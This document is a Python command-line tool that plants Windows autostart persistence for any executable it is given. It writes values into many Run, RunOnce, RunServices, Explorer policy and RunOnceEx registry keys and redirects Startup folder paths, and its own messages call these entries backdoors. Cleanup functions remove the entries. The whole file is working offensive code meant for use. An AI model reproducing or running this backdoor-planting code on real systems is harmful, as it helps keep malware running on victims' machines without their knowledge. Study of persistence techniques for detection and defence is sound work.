#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.04
# @Author  : Lhaihai
# @File    : startup.py
# @Software: PyCharm
# @Blog    : http://blog.Lhaihai.wang
"""
    Description : Run 自启动
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('StartUp')
from win32com.shell import shell
import sys,os

value_name = 'KPhSIluQy'

# 在HKCU的Run 添加
def set_user(cmd):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        try:
            reg.create_value(value_name, pyregedit.REG_SZ, cmd)
            logger.info('插入注册表成功')
        except:
            logger.error('插入注册表失败')
    else:
        #创建键
        logger.error('Run键值不存在')
        exit(0)

def set_user_runonce(cmd):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        try:
            reg.create_value(value_name, pyregedit.REG_SZ, cmd)
            logger.info('插入注册表成功')
        except:
            logger.error('插入注册表失败')
    else:
        #创建键
        logger.error('RunOnce 键不存在')
        exit(0)

def set_user_Explorer(cmd):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        try:
            reg.create_key()
            logger.info('创建 Explorer\Run 键值')
        except:
            logger.error('需要管理员权限')
            return
    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_user_RunServices(cmd):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\RunServices"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 RunServices 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_user_RunServicesOnce(cmd):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 RunServicesOnce 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

# 在HKLM的Run 添加
def set_system(cmd):

    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        #获取键(可用于其他操作)
        key = reg.get_key()
    else:
        #创建键
        logger.error('需要管理员权限！')
        return

    try:
        reg.create_value(value_name,pyregedit.REG_SZ,cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_system_runonce(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        try:
            reg.create_value(value_name, pyregedit.REG_SZ, cmd)
            logger.info('插入注册表成功')
        except:
            logger.error('插入注册表失败')
    else:
        #创建键
        logger.error('RunOnce 键不存在')
        exit(0)

def set_system_Explorer(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 Explorer\Run 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_system_RunServices(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\RunServices"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 RunServices 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_system_RunServicesOnce(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 RunServicesOnce 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_system_RunOnceEx_exe(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error('创建 RunOnceEx\\0001 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def set_system_RunOnceEx_dll(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend"
    reg = pyregedit.RegEdit(root,path)

    if reg.check_key():
        pass
    else:
        reg.create_key()
        logger.error(r'创建 RunOnceEx\0001\Depend 键值')

    try:
        reg.create_value(value_name, pyregedit.REG_SZ, cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

# 删除键值
def clear_system():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        try:
            if reg.delete_value(value_name):
                logger.info('Run 删除成功')
            else:
                logger.error('没有植入Run 后门')
        except:
            logger.error('Run 删除失败')
    else:
        logger.error('Run 需要管理员权限！')
        return

    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    reg = pyregedit.RegEdit(root,path)
    if reg.delete_value(value_name):
        logger.info('RunOnce 删除成功')

    path = r"Software\Microsoft\Windows\CurrentVersion\RunServices"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('RunServices 删除成功')
        except:
            logger.error('RunServices 删除失败')

    path = r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('RunServicesOnce 删除成功')
        except:
            logger.error('RunServicesOnce 删除失败')

    path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('Explorer\\Run 删除成功')
        except:
            logger.error('Explorer\\Run 删除失败')
    else:
        logger.error('没有植入HKLM Explorer\\Run 后门')

    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            try:
                reg.delete_sub_key('Depend')
                logger.info('RunOnceEx\\0001\\Depend 删除成功')
            except:
                pass
            reg.delete_current_key()
            logger.info('RunOnceEx\\0001 删除成功')
        except:
            logger.error('RunOnceEx\\0001 删除失败')
    else:
        logger.error('没有植入 RunOnceEx\\0001 后门')

    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('Explorer\\Run 删除成功')
        except:
            logger.error('Explorer\\Run 删除失败')
    else:
        logger.error('没有植入HKCU Explorer\\Run 后门')

# 删除键值
def clear_user():
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        try:
            if reg.delete_value(value_name):
                logger.info('Run 删除成功')
            else:
                logger.error('没有植入Run 后门')
        except:
            logger.error('Run 删除失败')
    else:
        pass

    path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    reg = pyregedit.RegEdit(root,path)
    if reg.delete_value(value_name):
        logger.info('RunOnce 删除成功')

    path = r"Software\Microsoft\Windows\CurrentVersion\RunServices"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('RunServices 删除成功')
        except:
            logger.error('RunServices 删除失败')

    path = r"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_current_key()
            logger.info('RunServicesOnce 删除成功')
        except:
            logger.error('RunServicesOnce 删除失败')

def set_user_startup_folder_user(startup_path):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        pass
    else:
        reg.create_key()

    try:
        reg.create_value('Startup',pyregedit.REG_SZ,startup_path)
        logger.info('User Shell Folders Startup 修改成功')
    except:
        logger.error('User Shell Folders Startup 修改失败')

def set_user_startup_folder_shell(startup_path):
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        pass
    else:
        reg.create_key()

    try:
        reg.create_value('Startup',pyregedit.REG_SZ,startup_path)
        logger.info('Shell Folders Startup 修改成功')
    except:
        logger.error('Shell Folders Startup 修改失败')

def clear_user_startup_folder():
    value = r'%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.create_value('Startup', pyregedit.REG_SZ, value)
            logger.info('User Shell Folders Startup 清除成功')
        except:
            logger.error('User Shell Folders Startup 清除失败')
    else:
        logger.info('User Shell Folders 键值不存在')



    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.create_value('Startup', pyregedit.REG_SZ, value)
            logger.info('Shell Folders Startup 清除成功')
        except:
            logger.error('Shell Folders Startup 清除失败')
    else:
        logger.info('Shell Folders 键值不存在')

def set_system_startup_folder_user(startup_path):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        pass
    else:
        logger.error('需要管理员权限！')
        return

    try:
        reg.create_value('Startup',pyregedit.REG_SZ,startup_path)
        logger.info('User Shell Folders Startup 修改成功')
    except:
        logger.error('User Shell Folders Startup 修改失败')

def set_system_startup_folder_shell(startup_path):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        pass
    else:
        logger.error('需要管理员权限！')
        return
    try:
        reg.create_value('Startup',pyregedit.REG_SZ,startup_path)
        logger.info('Shell Folders Startup 修改成功')
    except:
        logger.error('Shell Folders Startup 修改失败')

def clear_system_startup_folder():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_value('Startup')
            logger.info('User Shell Folders Startup 清除成功')
        except:
            logger.error('User Shell Folders Startup 清除失败')
    else:
        logger.error('需要管理员权限！')
        return


    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        try:
            reg.delete_value('Startup')
            logger.info('Shell Folders Startup 清除成功')
        except:
            logger.error('Shell Folders Startup 清除失败')
    else:
        logger.error('需要管理员权限！')
        return


options_user = {
    1 : set_user,
    2 : set_user_runonce,
    3 : set_user_RunServices,
    4 : set_user_RunServicesOnce,
    5 : set_user_startup_folder_user,
    6 : set_user_startup_folder_shell,
    7 : clear_user,
    8 : clear_user_startup_folder,
}

options_system = {
    1: set_system,
    2: set_system_runonce,
    3: set_system_RunServices,
    4: set_system_RunServicesOnce,
    5: set_system_Explorer,
    6: set_user_Explorer,
    7: set_system_RunOnceEx_dll,
    8: set_system_RunOnceEx_exe,
    9: set_system_startup_folder_user,
    10: set_system_startup_folder_shell,
    11: clear_system,
    12: clear_system_startup_folder,
}

struser= \
'''    startup 1 64.exe
    1 : set_user,
    2 : set_user_runonce,
    3 : set_user_RunServices,
    4 : set_user_RunServicesOnce,
    5 : set_user_startup_folder_user,
    6 : set_user_startup_folder_shell,
    7 : clear_user,
    8 : clear_user_startup_folder,'''

strsystem=\
'''    startup 1 64.exe
    1: set_system,
    2: set_system_runonce,
    3: set_system_RunServices,
    4: set_system_RunServicesOnce,
    5: set_system_Explorer,
    6: set_user_Explorer,
    7: set_system_RunOnceEx_dll,
    8: set_system_RunOnceEx_exe,
    9: set_system_startup_folder_user,
    10: set_system_startup_folder_shell,
    11: clear_system,
    12: clear_system_startup_folder,'''

if __name__ == '__main__':
    # cmd = r'C:\Users\test\Desktop\startup\64.exe'
    # path = r'C:\Users\test\Desktop\startup'
    action = int(sys.argv[1]) if len(sys.argv) > 1 else ''
    cmd = sys.argv[2] if len(sys.argv) > 2 else ''
    if ':' not in cmd and '\\' not in cmd:
        cmd = os.getcwd() + '\\' + cmd
    if shell.IsUserAnAdmin():
        if not action or not cmd:
            print(strsystem)
        elif action == 11 or action == 12:
            options_system[action]()
        else:
            options_system[action](cmd)
    else:
        if not action or not cmd:
            print(struser)
        elif action == 7 or action == 8:
            options_user[action]()
        else:
            options_user[action](cmd)
